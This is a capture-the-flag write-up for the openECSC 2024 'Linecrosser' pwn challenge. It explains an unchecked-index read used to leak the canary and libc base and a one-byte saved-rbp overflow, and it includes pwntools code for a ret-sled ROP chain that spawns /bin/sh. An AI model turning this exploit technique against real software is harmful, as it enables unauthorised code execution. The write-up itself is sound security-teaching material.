# openECSC 2024 - Round 1

## [pwn] Linecrosser (44 solves)

Check out this sick game with dark humour, will you be the first one to cross the line and go too far?

`nc linecrosser.challs.open.ecsc2024.it 38002`

The docker image for this challenge is `cybersecnatlab/challenge-jail@sha256:7bf77225063b039960f654307cf5d6f977f892ff548606357a2e8fe8067d0a88`.

Author: Fabio Zoratti <@orsobruno96>

## Overview
The challenge is presented as a standard compiled C source file that has the classical "menu" of pwn challenges.

The choices are not many
```
Welcome to Cards Against Hackers TM
Who will be the first to cross the line and `buttarla di fuori`?
1) Play
2) Create custom card
3) Show custom card
4) Exit
```

You can play an incomplete version of Card Against Humanity with a very small deck, and create your own cards. There is no win function in this binary, so it seems to be necessary to completely hijack the execution flow of the program and `execve(/bin/sh)`. The binary is compiled with some, but not all protections:
- no canary
- ASLR is active
- there are no rwx regions

Dynamical memory allocations is done twice with `malloc`, but you cannot double free if you never free, so a heap exploitation seems not viable.
However we can find at least two different vulnerabilities:
- a read primitive in `show_custom_card`. No bound check is performed at all on the index of the card, and this means that we can use it to leak data.
```c
  switch (choice) {
  case 1:
    printf("Answer: '%s'\n", answers[choice2].content);
    break;
  case 2:
    printf("Prompt (%llu completions): '%s'\n", prompts[choice2].number_of_completions, prompts[choice2].content);
    break;
```
we have to be careful, because it is really easy to dereference an invalid pointer and crash the program, using the '%s'.
- a tiny buffer overflow in `create_custom_card`. The overflow can overwrite only the LSB of `old_rbp` on the stack, but this may be sufficient for a _probabilistic_ rop chain. If we overwrite with a null byte the LSB, the old rbp will go up in the stack, and if we exit two functions, with `leave; ret;`, we may find ourselves on the buffer that we can control.

## Strategy
- leak libc_base and/or binary base with vulnerability number 1, reading data from the stack. Here in the writeup, also the canary is read, just in case.
  To simplify our exploit, we use the internal functions of pwntools to compute addresses. The libc binary always has ASLR active, so to compute the address of a symbol we can set the property `libc.address`, and the next time we access a symbol, like `libc.sym['printf']`, it will have the correct absolute address.

```python
from re import search
from pwn import log


def menu(io, choice: int):
    io.sendlineafter(b"4) Exit", f"{choice}".encode())

def show_card(io, num: int):
    menu(io, 3)
    io.sendlineafter(b"Answer (1)", b"2")
    io.sendlineafter(b"Which one?", f"{num}".encode())
    content = search(r"Prompt \(([0-9]+) completions\): '", io.recvuntil(b"'").decode()).groups(1)
    return int(content[0], 10)


def main():
    io = process(exe.path)
    END = 0x3f8
    CANARY_OFF = 41
    LIBC_OFF = 42
    canary = show_card(io, CANARY_OFF)
    log.success(f"{canary = :#018x}")
    address = show_card(io, LIBC_OFF)
    libc.address = address - (libc.sym['__libc_start_main'] + 0x80)
    log.success(f"{libc.address = :#018x}")

```

- prepare a rop chain with a "ret sled" on the stack, in order to maximize the probability of returning on a valid start for the rop chain
  A "ret" sled is simply a long rop chain with the gadget that performs only the "ret" instruction. This is useful because if we do not know exactly where we will start, this allows us to have a big memory region where we can land and perform the correct operations after some no-ops.

  In this case we do not need to set rdx, because it already contains a valid memory reference to some dummy environment. Finding a gadget with rdx is always a bit more painful than `rdi` or `rsi`.

```python
def create_prompt(io, numcomp: int, content: bytes):
    menu(io, 2)
    io.sendlineafter(b"Answer (1)", b"2")
    io.sendafter(b"prompt", content)
    io.sendlineafter(b"completions?", f"{numcomp}".encode())


def main():
    ....
    path = find_gadgets()
    RET = search_gadget("ret", "ret", path)
    POP_RDI = search_gadget("pop rdi; ret;", "pop rdi", path)
    POP_RSI = search_gadget("pop rsi; ret;", "pop rsi", path)
    chain = flat(
        POP_RDI,
        next(libc.search(b"/bin/sh\x00")),
        POP_RSI,
        0,
        libc.sym['execve']
    )
    filler = [RET for _ in range((END - len(chain)) // 8)]
    create_prompt(io, 0, flat({
       0: flat(
          *filler,
          chain,
       ),
       END: flat(
            canary,
        ),
    }))

```

- run the exploit until it works (should be a sufficiently large probability, > 10%). Experimentally I found approximately between 1/3 and 1/2.
